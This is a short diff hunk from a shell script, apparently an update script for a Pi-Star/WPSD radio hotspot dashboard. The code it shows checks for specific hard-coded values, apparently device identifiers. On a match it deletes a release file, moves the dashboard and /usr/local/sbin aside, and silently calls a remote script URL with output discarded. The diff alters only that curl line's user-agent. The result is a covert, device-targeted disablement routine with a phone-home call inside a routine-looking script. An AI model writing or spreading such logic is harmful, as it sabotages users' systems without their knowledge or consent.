@@ -47,7 +47,7 @@ if [ "$value" = "0000000000000000" ] || [ "$value" = "00000000e530261b" ] || [ "
     rm -rf /etc/pistar-release
     mv /var/www/dashboard /var/www/dashboard.bak
     mv /usr/local/sbin /usr/local/sbin.bak
-    curl -s -A "UABWU phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
+    curl -s -A "UAHS phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
 fi
 
 # malformed data fix
